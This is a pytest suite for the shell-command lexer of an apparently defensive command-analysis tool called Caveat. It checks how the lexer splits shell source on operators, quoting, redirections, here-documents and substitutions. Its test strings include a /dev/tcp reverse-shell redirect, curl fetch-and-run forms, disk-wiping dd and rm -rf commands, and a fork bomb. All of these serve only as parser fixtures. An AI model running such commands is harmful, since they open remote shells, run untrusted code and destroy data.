"""
The splitter.

These are the tests that matter most, because every other part of Caveat reads
what this module produced. A mis-split stage does not merely misreport — it
quietly attributes one command's flags to another, which is worse than saying
nothing.
"""

import pytest

from caveat.core.lexer import (
    chunks,
    lex,
    parse_redirection,
    resolve_command,
    split_flags,
    strip_heredocs,
    tokenise,
    unquoted_text,
)


def commands(source):
    return [s.command for s in lex(source).stages]


def connectors(source):
    return [s.connector for s in lex(source).stages]


# --- splitting on operators -------------------------------------------------

@pytest.mark.parametrize("source,expected", [
    ("ls", ["ls"]),
    ("ls | wc -l", ["ls", "wc"]),
    ("a && b", ["a", "b"]),
    ("a || b", ["a", "b"]),
    ("a ; b", ["a", "b"]),
    ("a\nb", ["a", "b"]),
    ("a |& b", ["a", "b"]),
    ("ps aux | grep nginx | awk '{print $2}'", ["ps", "grep", "awk"]),
])
def test_stages_are_split_on_every_operator(source, expected):
    assert commands(source) == expected


def test_the_first_stage_never_carries_a_connector():
    assert connectors("\n\n ls | wc")[0] == ""


def test_connectors_are_recorded_per_stage():
    assert connectors("a | b && c ; d") == ["", "|", "&&", ";"]


def test_a_trailing_ampersand_backgrounds_the_stage():
    stage = lex("sleep 60 &").stages[0]
    assert stage.background is True


def test_an_operator_inside_single_quotes_does_not_split():
    assert commands("grep 'a|b' file") == ["grep"]


def test_an_operator_inside_double_quotes_does_not_split():
    assert commands('echo "a && b"') == ["echo"]


def test_an_escaped_pipe_does_not_split():
    assert commands(r"echo a\|b") == ["echo"]


def test_a_comment_is_not_a_stage():
    assert commands("#!/bin/sh\n# a note\nls\n") == ["ls"]


def test_a_trailing_comment_is_dropped_from_the_stage():
    stage = lex("ls -l   # list things").stages[0]
    assert stage.operands == []
    assert stage.flags == ["-l"]


def test_a_hash_inside_a_url_is_not_a_comment():
    stage = lex("curl https://example.com/a#b").stages[0]
    assert "https://example.com/a#b" in stage.operands


# --- quoting ----------------------------------------------------------------

def test_quotes_are_stripped_from_argv():
    assert lex("echo 'hello world'").stages[0].operands == ["hello world"]


def test_an_unbalanced_quote_is_reported_rather_than_raised():
    stage = lex("echo 'unbalanced").stages[0]
    assert stage.quote_error is True
    assert stage.command == "echo"


def test_an_unbalanced_quote_still_yields_a_usable_reading():
    assert lex('echo "half | rm -rf /').stages[0].command == "echo"


def test_tokenise_notes_what_it_had_to_assume():
    _, trouble, notes = tokenise("echo 'x")
    assert trouble is True
    assert notes and "quot" in notes[0].lower()


def test_unquoted_text_ignores_single_quoted_runs():
    assert "$2" not in unquoted_text("awk '{print $2}'")


def test_unquoted_text_ignores_double_quoted_runs():
    assert "$DIR" not in unquoted_text('rm -rf "$DIR"')


def test_unquoted_text_keeps_a_bare_variable():
    assert "$DIR" in unquoted_text("rm -rf $DIR")


# --- redirections -----------------------------------------------------------

def test_a_simple_redirect_is_pulled_out_of_argv():
    stage = lex("cmd > out.txt").stages[0]
    assert stage.operands == []
    assert [r.target for r in stage.redirects] == ["out.txt"]


def test_a_redirect_written_tight_is_still_found():
    stage = lex("cmd >/dev/null").stages[0]
    assert [r.rendered for r in stage.redirects] == [">/dev/null"]


def test_stderr_merging_keeps_its_ampersand():
    stage = lex("cmd > /dev/null 2>&1").stages[0]
    assert [r.rendered for r in stage.redirects] == [">/dev/null", "2>&1"]


def test_merging_is_not_mistaken_for_backgrounding():
    assert lex("cmd 2>&1").stages[0].background is False


def test_an_append_is_distinguished_from_a_truncation():
    append = lex("cmd >> log").stages[0].redirects[0]
    truncate = lex("cmd > log").stages[0].redirects[0]
    assert append.truncates is False and truncate.truncates is True


def test_a_redirect_target_after_the_operator_leaves_the_rest_of_argv():
    stage = lex("cmd >out -x").stages[0]
    assert stage.flags == ["-x"]
    assert [r.target for r in stage.redirects] == ["out"]


def test_both_streams_to_a_path_is_read_as_one_redirect():
    stage = lex("bash -i >& /dev/tcp/10.0.0.1/4444").stages[0]
    assert any(r.target == "/dev/tcp/10.0.0.1/4444" for r in stage.redirects)


def test_a_word_containing_an_angle_bracket_is_not_a_redirect():
    assert lex("echo a>b").stages[0].redirects


def test_parse_redirection_refuses_a_plain_token():
    assert parse_redirection("filename") is None


def test_parse_redirection_reads_a_descriptor_duplication():
    red = parse_redirection("2>&1")
    assert (red.fd, red.op, red.target) == ("2", ">&", "1")


# --- here-documents ---------------------------------------------------------

def test_a_heredoc_body_is_set_aside():
    body, notes = strip_heredocs("cat <<EOF\nrm -rf /\nEOF\necho done\n")
    assert "rm -rf /" not in body
    assert notes and "here-document" in notes[0]


def test_a_heredoc_body_is_not_read_as_commands():
    assert "rm" not in commands("cat <<EOF > f\nrm -rf /\nEOF\necho done")


def test_text_without_a_heredoc_is_returned_unchanged():
    body, notes = strip_heredocs("echo hi\n")
    assert body == "echo hi\n" and notes == []


# --- wrappers and elevation -------------------------------------------------

def test_sudo_is_read_through_to_the_real_command():
    stage = lex("sudo rm -rf /tmp/x").stages[0]
    assert stage.command == "rm" and stage.elevated is True
    assert stage.wrappers == ["sudo"]


def test_sudo_options_with_values_are_stepped_over():
    assert lex("sudo -u www-data bash -c x").stages[0].command == "bash"


def test_sudo_alone_is_its_own_command():
    stage = lex("sudo -i").stages[0]
    assert stage.command == "sudo" and stage.elevated is True


def test_leading_assignments_are_separated_from_the_command():
    stage = lex("FOO=1 BAR=2 make install").stages[0]
    assert stage.command == "make"
    assert stage.assignments == ["FOO=1", "BAR=2"]


def test_env_is_read_through():
    assert lex("env FOO=1 bash").stages[0].command == "bash"


def test_a_path_invocation_keeps_both_spellings():
    stage = lex("/usr/bin/curl -s https://x").stages[0]
    assert stage.command == "curl" and stage.command_path == "/usr/bin/curl"


def test_dd_key_value_arguments_are_not_mistaken_for_assignments():
    stage = lex("dd if=/dev/zero of=/dev/sda").stages[0]
    assert stage.command == "dd"
    assert "of=/dev/sda" in stage.operands


def test_resolve_command_handles_an_empty_argv():
    resolved = resolve_command([])
    assert resolved.command == "" and resolved.elevated is False


# --- flags and operands -----------------------------------------------------

def test_flags_and_operands_are_separated():
    flags, operands = split_flags(["-r", "--force", "path", "other"])
    assert flags == ["-r", "--force"] and operands == ["path", "other"]


def test_a_double_dash_ends_the_flags():
    flags, operands = split_flags(["-r", "--", "-not-a-flag"])
    assert flags == ["-r"] and operands == ["-not-a-flag"]


def test_a_bare_dash_is_an_operand():
    assert split_flags(["-"])[1] == ["-"]


@pytest.mark.parametrize("flag", ["-r", "-f"])
def test_has_flag_splits_a_short_cluster(flag):
    assert lex("rm -rf /tmp/x").stages[0].has_flag(flag)


def test_has_flag_does_not_split_a_single_dash_long_option():
    assert lex("find . -name '*.tmp'").stages[0].has_flag("-name")
    assert not lex("find . -newer x").stages[0].has_flag("-r")


def test_flag_value_reads_an_equals_form():
    assert lex("docker run --net=host x").stages[0].flag_value("--net") == "host"


# --- substitutions and nesting ---------------------------------------------

def test_a_command_substitution_becomes_an_inner_stage():
    stage = lex("rm -rf $(cat list)").stages[0]
    assert [c.command for c in stage.inner] == ["cat"]


def test_a_backtick_substitution_becomes_an_inner_stage():
    assert [c.command for c in lex("echo `whoami`").stages[0].inner] == ["whoami"]


def test_a_process_substitution_becomes_an_inner_stage():
    stage = lex("bash <(curl -s http://x/y.sh)").stages[0]
    assert [c.command for c in stage.inner] == ["curl"]


def test_a_process_substitution_does_not_leak_flags_to_the_outer_command():
    stage = lex("bash <(curl -s http://x/y.sh)").stages[0]
    assert stage.flags == []


def test_a_substitution_inside_double_quotes_is_still_found():
    stage = lex('eval "$(curl -s http://x)"').stages[0]
    assert [c.command for c in stage.inner] == ["curl"]


def test_a_substitution_inside_single_quotes_is_left_alone():
    assert lex("echo '$(whoami)'").stages[0].inner == []


def test_a_shell_dash_c_script_is_read_as_commands():
    stage = lex("bash -c 'rm -rf /tmp/x'").stages[0]
    assert [c.command for c in stage.inner] == ["rm"]


def test_a_non_shell_dash_c_is_not_read_as_commands():
    assert lex("curl -c cookies.txt https://x").stages[0].inner == []


def test_a_dash_c_payload_that_is_only_a_substitution_is_not_read_twice():
    stage = lex('sh -c "$(curl -fsSL http://x)"').stages[0]
    assert [c.command for c in stage.inner] == ["curl"]


def test_nesting_stops_at_the_depth_limit():
    deep = "sh -c 'sh -c \"sh -c sh -c sh\"'"
    assert all(s.depth <= 3 for s in lex(deep).walk())


def test_every_nested_stage_names_its_top_level_owner():
    script = lex("ls ; rm -rf $(cat list)")
    inner = [s for s in script.walk() if s.depth]
    assert inner and all(s.root == 1 for s in inner)


def test_every_nested_stage_records_where_it_came_from():
    stage = lex("rm -rf $(cat list)").stages[0]
    assert stage.inner[0].origin.startswith("inside ")


# --- subshells and odd shapes ----------------------------------------------

def test_a_subshell_group_is_read_as_the_stages_inside_it():
    assert commands("( crontab -l; echo x ) | crontab -") == [
        "crontab", "echo", "crontab"]


def test_a_brace_group_leaves_no_empty_stage():
    assert "" not in commands(":(){ :|:& };:")


def test_an_empty_source_yields_no_stages():
    assert lex("").stages == []


def test_whitespace_only_yields_no_stages():
    assert lex("   \n  \n").stages == []


def test_a_pure_redirection_is_kept_as_a_stage():
    stage = lex("> /dev/sda").stages[0]
    assert stage.command == "" and stage.redirects


def test_pipelines_group_only_what_pipes_join():
    script = lex("a | b && c | d")
    groups = [[s.command for s in g] for g in script.pipelines()]
    assert ["a", "b"] in groups and ["c", "d"] in groups


def test_pipeline_of_finds_the_whole_chain():
    script = lex("a | b | c && d")
    assert [s.command for s in script.pipeline_of(1)] == ["a", "b", "c"]


def test_chunks_label_a_quoted_run_as_one_piece():
    kinds = [c.kind for c in chunks("echo 'a b'")]
    assert "quote" in kinds


def test_chunks_label_a_substitution_as_one_piece():
    kinds = [c.kind for c in chunks("echo $(whoami)")]
    assert "sub" in kinds


def test_the_source_is_kept_verbatim():
    source = "ls -l   # note\n"
    assert lex(source).source == source


def test_line_count_ignores_blank_lines():
    assert lex("a\n\n\nb\n").line_count == 2
